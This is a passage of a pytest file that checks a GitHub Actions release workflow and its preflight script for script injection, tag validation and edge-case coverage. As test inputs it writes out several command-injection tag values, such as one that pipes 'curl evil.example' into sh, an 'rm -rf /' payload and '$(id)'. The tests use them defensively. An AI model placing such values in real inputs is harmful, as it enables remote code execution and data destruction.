    automatic ``github.token`` rather than a stored secret AC3 does not record.
    """
    text = _WORKFLOW.read_text(encoding="utf-8")
    step_start = text.index("--phase pre-build")
    # The env block for a step precedes its `run:`; take the step's slice back to its name.
    step_slice = text[text.rindex("- name:", 0, step_start): step_start]
    assert "GH_TOKEN: ${{ github.token }}" in step_slice, (
        "the pre-build preflight step has no GH_TOKEN, so `gh release list` fails on "
        "authentication and E4 can never fire in CI"
    )
    assert "secrets." not in text, "the release workflow must need no stored secret (AC3)"


def test_TC_ArgusAgent_RELEASE_001_17_untrusted_input_never_reaches_shell_source() -> None:
    """TC-ArgusAgent-RELEASE-001-17 — AC2/security: no script injection on a contents:write job.

    A ``${{ }}`` expression is expanded by the runner INTO the shell source text before
    bash parses it. ``workflow_dispatch.inputs.tag`` is free-form — the ``v[0-9]+...``
    filter constrains only the tag-PUSH trigger — so a crafted dispatch value interpolated
    into a ``run:`` body executes arbitrary commands in a job holding ``contents: write``
    and ``github.token``. Three properties, all necessary:

    1. NO ``run:`` body contains a ``${{ }}`` expression at all (values arrive via ``env:``
       and are referenced as quoted shell variables).
    2. The tag is bound through ``env:`` on every step that uses it.
    3. The value is validated against the single ``^v\\d+\\.\\d+\\.\\d+$`` pattern BEFORE
       any other command sees it.
    """
    text = _WORKFLOW.read_text(encoding="utf-8")
    bodies = _run_block_bodies(text)
    assert bodies, "the run-block extractor found nothing — the extractor itself is broken"

    interpolating = [body for body in bodies if "${{" in body]
    assert not interpolating, (
        "a `run:` body interpolates a `${{ }}` expression directly into shell source, "
        f"which is the script-injection anti-pattern: {interpolating}"
    )

    assert "TAG: ${{ inputs.tag || github.ref_name }}" in text, (
        "the untrusted dispatch input must be bound through `env:`, not interpolated"
    )
    assert text.count("TAG: ${{ steps.resolve.outputs.tag }}") >= 3, (
        "every later step that uses the tag must bind it through `env:` too"
    )

    validate_at = text.index("--phase validate-tag")
    for later in ("--phase pre-build", "--phase post-build", "gh release create"):
        assert validate_at < text.index(later), (
            f"the tag validation must run before {later!r}; a validator that runs after "
            "the value has already reached a command protects nothing"
        )
    # And the validator really refuses a crafted value, before touching git or `gh`.
    assert rp.normalize_tag('v0.1.0"; curl evil.example | sh #') is None
    assert rp.normalize_tag("v0.1.0") == "0.1.0"


def test_TC_ArgusAgent_RELEASE_001_18_e2_unreachability_is_disclosed_and_pinned() -> None:
    """TC-ArgusAgent-RELEASE-001-18 — AC5: the enumeration does not read as more active than it is.

    ``-02`` asserts every member is assigned to a phase. That is necessary and NOT
    sufficient: E2 only fires when the run is CREATING the tag, and neither committed
    trigger does, so no CI path reaches it. Rather than pass ``--creating-tag`` on the
    dispatch path — which would be a false statement about what that run is doing, and
    would refuse every legitimate dispatch — the gap is DISCLOSED in ``CI_UNREACHABLE``,
    printed next to E2 in the report, and pinned here in both directions: the disclosure
    may not name a member that is reachable, and the workflow may not become reachable
    while the disclosure still says it is not.
    """
    assert set(rp.CI_UNREACHABLE) <= set(rp.RELEASE_EDGE_CASE_IDS)
    assert set(rp.CI_UNREACHABLE) == {"E2"}, (
        "the CI-reachability disclosure changed; re-derive it against the workflow"
    )

    text = _WORKFLOW.read_text(encoding="utf-8")
    assert "--creating-tag" not in text, (
        "the workflow now passes --creating-tag, so E2 IS reachable — remove it from "
        "CI_UNREACHABLE (and from the workflow header comment) rather than leaving a "
        "stale disclosure behind"
    )
    # The cause is real: with creating_tag False, E2 cannot fire whatever the tag list says.
    assert rp.check_e2_tag_already_exists(
        _ctx(creating_tag=False, existing_tags=("v0.1.0",))
    ) is None
    assert rp.check_e2_tag_already_exists(
        _ctx(creating_tag=True, existing_tags=("v0.1.0",))
    ) is not None
    # The workflow header states it in prose too, so a reader of the file is not left to
    # infer it from a Python constant.
    assert "E2 is not reachable from this workflow" in text


def test_TC_ArgusAgent_RELEASE_001_19_a_bad_tag_is_refused_before_anything_else_runs(
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    """TC-ArgusAgent-RELEASE-001-19 — AC2/security: validation happens before collection.

    ``--phase validate-tag`` must reject a malformed tag WITHOUT gathering context — no
    git subprocess, no ``gh`` call, nothing that could act on the crafted value. The
    guard is proven by making ``gather_context`` explode: if it is reached, this fails.
    """
    def _must_not_run(*_a: object, **_k: object) -> rp.PreflightContext:
        raise AssertionError("gather_context ran before the tag was validated")

    monkeypatch.setattr(rp, "gather_context", _must_not_run)

    assert rp.main(["--tag", "v0.1.0", "--phase", "validate-tag"]) == 0
    assert "expected v<major>.<minor>.<patch> shape" in capsys.readouterr().out

    for crafted in ('v0.1.0"; rm -rf / #', "$(id)", "v0.1", "main", "v0.1.0\nmalicious=1"):
        assert rp.main(["--tag", crafted, "--phase", "validate-tag"]) == 1, (
            f"a malformed tag was accepted: {crafted!r}"
        )
        assert "RELEASE REFUSED" in capsys.readouterr().out

    # And the refusal is enforced on the real phases too, not only in validate-tag mode.
    assert rp.main(["--tag", "not-a-tag", "--phase", "pre-build"]) == 1


# ─────────────────────────────────────────────────────────────────────────────────────
# Story 12.9 / AC7 — the edge cases, REHEARSED on the channel that actually ships
#
# `epics.md:2471-2473` asks for E1..E6 to be re-proven *"against the index channel"*. The
# index channel DOES NOT SHIP, and that is not this story's preference but a locked decision
# restated in four places (`README.md`, `release.yml:24-29`, `architecture.md` §I,
# `sprint-status.yaml:350` = Story 9.2 / D1-D13): an index publish is permanently
# irreversible, needs a credential this repository cannot prove exists, and is an operator
# decision taken with credentials in hand. `epics.md:2465` is PERMISSIVE ("may ship"), not
# mandatory. So the AC is ANSWERED rather than missed (Story 12.9 / DN-1): E1..E6 are
# re-proven against the channel that ships — the tag + GitHub Release channel — through the
# real CLI, over a real local build, in a rehearsal that PUBLISHES NOTHING.
#
# `-03`..`-08` already give each handler a refusing and a non-refusing case as pure calls.
# This is the different job: it drives `main()` end to end, the way `release.yml` does, and
# asserts the printed REPORT covers every enumerated member — a rehearsal that exercised four
# of six and passed is the AI-E8-6 defect that all five Epic-8 stories shipped.
# ─────────────────────────────────────────────────────────────────────────────────────

_REPORT_LINE = __import__("re").compile(
    r"^  (?P<case>E\d) .*?\s(?P<status>REFUSE|UNKNOWN|ok)(?P<note> \(not reachable[^)]*\))?$"
)


def _rehearse(
    capsys: pytest.CaptureFixture[str], argv: list[str]
) -> tuple[int, dict[str, str], str]:
    """Run the preflight CLI and read the outcome it PRINTED for each enumerated member.

    The report is the surface an operator and a workflow log actually read, so the rehearsal
    is asserted against it rather than against the return values — a check that clears
    internally while printing something else is the defect class this project keeps finding.
    """
    code = rp.main(argv)
    out = capsys.readouterr().out
    outcomes: dict[str, str] = {}
    for line in out.splitlines():
        match = _REPORT_LINE.match(line.rstrip())
        if match:
            outcomes[match.group("case")] = match.group("status")
    return code, outcomes, out


def _rehearsal_repo(tmp_path: Path) -> Path:
    """A disposable git repository to rehearse against.

    ⚠️ The tag below is created in a THROWAWAY FIXTURE repository under ``tmp_path``. No tag
    is created in, and nothing is pushed from, this repository at any point — Story 12.9 /
    AC9 fences those acts and this rehearsal does not touch them. The fixture exists so E1's
    and E2's real states are reachable deterministically instead of depending on whatever the
    developer's working tree happens to look like.
    """
    import shutil
    import subprocess

    repo = tmp_path / "rehearsal-repo"
    repo.mkdir()
    shutil.copyfile(_REPO_ROOT / "pyproject.toml", repo / "pyproject.toml")

    def git(*args: str) -> None:
        done = subprocess.run(
            ["git", "-C", str(repo), *args], capture_output=True, text=True
        )
        assert done.returncode == 0, f"git {args}: {done.stderr}"

    git("init")
    git("config", "user.email", "rehearsal@argus.test")
    git("config", "user.name", "ArgusAgent Rehearsal")
    git("add", "-A")
    git("commit", "-m", "rehearsal fixture")
    git("tag", "v0.1.0")
    return repo


def test_TC_ArgusAgent_RELEASE_001_29_every_enumerated_edge_case_is_rehearsed(
    tmp_path: Path,
    capsys: pytest.CaptureFixture[str],
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """TC-ArgusAgent-RELEASE-001-29 — Story 12.9 / AC7: the rehearsal covers ALL SIX, by closure.

    OBSERVABLE: the status the preflight PRINTS for each enumerated member across
    ``--phase validate-tag`` / ``pre-build`` / ``post-build``, driven over a real local build.

    The population is derived from ``RELEASE_EDGE_CASE_IDS`` and the floor is *every* member —
    not a sample. ``E4``'s three-valuedness is exercised in all three states, and ``UNKNOWN``
    is asserted never to become ``ok``: *a guard that cannot observe is not a guard*.

    Offline: ``_published_release_tags`` is INJECTED rather than allowed to shell out to
    ``gh``, which would put a network call in the suite. The live read was taken separately,
    read-only, and recorded in the story's Dev Agent Record — it is evidence, not a test
    dependency.
    """
    from tests.test_built_distribution import _distribution

    dist = _distribution()
    repo = _rehearsal_repo(tmp_path)
    covered: set[str] = set()

    # ── phase 1: validate-tag. Refuses a crafted value before anything else runs. ──
    assert rp.main(["--phase", "validate-tag", "--tag", "v0.1.0"]) == 0
    assert "expected v<major>.<minor>.<patch> shape" in capsys.readouterr().out
    assert rp.main(["--phase", "validate-tag", "--tag", 'v0.1.0"; id #']) == 1
    assert "RELEASE REFUSED" in capsys.readouterr().out

    # ── phase 2: pre-build over the clean fixture, with the release list ASKED and empty ──
    monkeypatch.setattr(rp, "_published_release_tags", lambda root: ())
    code, outcomes, _ = _rehearse(
        capsys, ["--phase", "pre-build", "--tag", "v0.1.0", "--repo-root", str(repo)]
    )
    covered |= set(outcomes)
    assert code == 0, "a clean fixture at the matching version was refused"
    assert outcomes == {"E1": "ok", "E2": "ok", "E3": "ok", "E4": "ok", "E5": "ok"}, outcomes

    # ── E1 refuses a dirty tree (the same fixture, dirtied) ──
    (repo / "pyproject.toml").write_text(
        (repo / "pyproject.toml").read_text(encoding="utf-8") + "\n# dirty\n",
        encoding="utf-8",
    )
    code, outcomes, out = _rehearse(
        capsys, ["--phase", "pre-build", "--tag", "v0.1.0", "--repo-root", str(repo)]
    )
    assert code == 1 and outcomes["E1"] == "REFUSE", outcomes
    assert "RELEASE REFUSED" in out and "pyproject.toml" in out
    import subprocess

    subprocess.run(["git", "-C", str(repo), "checkout", "--", "."], check=True)

    # ── E2 refuses re-creating an existing tag. This is the member CI_UNREACHABLE says the
    # WORKFLOW cannot reach; it is reachable LOCALLY, and Story 12.9 exercises it here rather
    # than leaving a five-story-old "unreachable" claim standing unexamined. ──
    code, outcomes, out = _rehearse(
        capsys,
        [
            "--phase", "pre-build", "--tag", "v0.1.0",
            "--repo-root", str(repo), "--creating-tag",
        ],
    )
    assert code == 1 and outcomes["E2"] == "REFUSE", outcomes
    assert "already exists in this repository" in out
    assert "not reachable from this workflow" in out, (
        "the report no longer prints E2's reachability disclosure next to it, so the "
        "enumeration reads as more active than it is"
    )

    # ── E4's THREE outcomes, all of them, and UNKNOWN is never a clearance ──
    monkeypatch.setattr(rp, "_published_release_tags", lambda root: ("v0.1.0",))
    code, outcomes, out = _rehearse(
        capsys, ["--phase", "pre-build", "--tag", "v0.1.0", "--repo-root", str(repo)]
    )
    assert code == 1 and outcomes["E4"] == "REFUSE" and "a release already exists" in out

    monkeypatch.setattr(rp, "_published_release_tags", lambda root: None)
    code, outcomes, out = _rehearse(
        capsys, ["--phase", "pre-build", "--tag", "v0.1.0", "--repo-root", str(repo)]
    )
    assert outcomes["E4"] == "UNKNOWN", outcomes
    assert code == 0, "an unobservable E4 must not fail the run; it must not clear it either"
    assert "NOT EVALUATED" in out and "not a clearance" in out, (
        "E4 could not observe the published-release list and the report did not say so. "
        "Printing `ok` for a question it never got to put is the exact defect Story 9.2's "
        "review found on this workflow."
    )
    assert not [
        line
        for line in out.splitlines()
        if line.startswith("  E4") and line.rstrip().endswith("ok")
    ], "E4 printed `ok` on the report line for a question it could not put"

    # ── E5 refuses a tag/version mismatch ──
    monkeypatch.setattr(rp, "_published_release_tags", lambda root: ())
    code, outcomes, out = _rehearse(
        capsys, ["--phase", "pre-build", "--tag", "v9.9.9", "--repo-root", str(repo)]
    )
    assert code == 1 and outcomes["E5"] == "REFUSE", outcomes
    assert "pyproject.toml states" in out

    # ── phase 3: post-build over the REAL local build, then over an empty directory ──
    code, outcomes, out = _rehearse(
        capsys,
        [
            "--phase", "post-build", "--tag", "v0.1.0",
            "--repo-root", str(repo), "--dist-dir", str(dist.wheel.parent),
        ],
    )
    covered |= set(outcomes)
    assert code == 0 and outcomes == {"E6": "ok"}, outcomes
    assert dist.wheel.is_file() and dist.sdist.is_file()

    empty = tmp_path / "empty-dist"
    empty.mkdir()
    code, outcomes, out = _rehearse(
        capsys,
        [
            "--phase", "post-build", "--tag", "v0.1.0",
            "--repo-root", str(repo), "--dist-dir", str(empty),
        ],
    )
    assert code == 1 and outcomes["E6"] == "REFUSE" and "no artifact at all" in out

    # ── THE FLOOR: every enumerated member was actually exercised through the CLI ──
    assert covered == set(rp.RELEASE_EDGE_CASE_IDS), (
        "the rehearsal did not cover every enumerated release edge case. A rehearsal "
        f"narrower than its own AC is a breach, not a satisfaction (AI-E8-6): covered "
        f"{sorted(covered)}, enumerated {sorted(rp.RELEASE_EDGE_CASE_IDS)}."
    )
    # ...and NOTHING was published. The rehearsal never creates a tag in this repository,
    # never pushes and never calls `gh release create`; the only tag it touches lives in a
    # throwaway fixture under tmp_path.
    assert rp._git(_REPO_ROOT, "tag", "-l") == "", (
        "a tag exists in THIS repository. The rehearsal must publish nothing (AC8/AC9)."
    )


def test_TC_ArgusAgent_RELEASE_001_30_e2s_unreachability_note_is_re_decided_with_a_date() -> None:
    """TC-ArgusAgent-RELEASE-001-30 — Story 12.9 / AC7: the disclosure was RE-EXAMINED, not inherited.

    OBSERVABLE: ``CI_UNREACHABLE["E2"]``'s text.

    ``-18`` pins that the disclosure is TRUE of the workflow. This pins that it was re-decided
    rather than carried forward unread: Story 12.9 is the first story that can reach E2
    locally, it did (``-29``), and the note now records the date of that re-examination and
    distinguishes the two reachabilities instead of implying the case is dead.
    """
    note = rp.CI_UNREACHABLE["E2"]
    for required, why in (
        ("2026-08-15", "the date the claim was re-examined"),
        ("Story 12.9", "who re-examined it"),
        ("TC-ArgusAgent-RELEASE-001-29", "the rehearsal that exercised it locally"),
        ("local-tooling guard", "what the member actually is"),
    ):
        assert required in note, (
            f"CI_UNREACHABLE['E2'] does not state {required!r} — {why}. A five-story-old "
            "'unreachable' claim standing unexamined in the story that publishes is exactly "
            "what AC7 asked to be re-decided."
        )
    # The claim it makes about the WORKFLOW is still true, and still checked by -18.
    assert "--creating-tag" not in _WORKFLOW.read_text(encoding="utf-8")
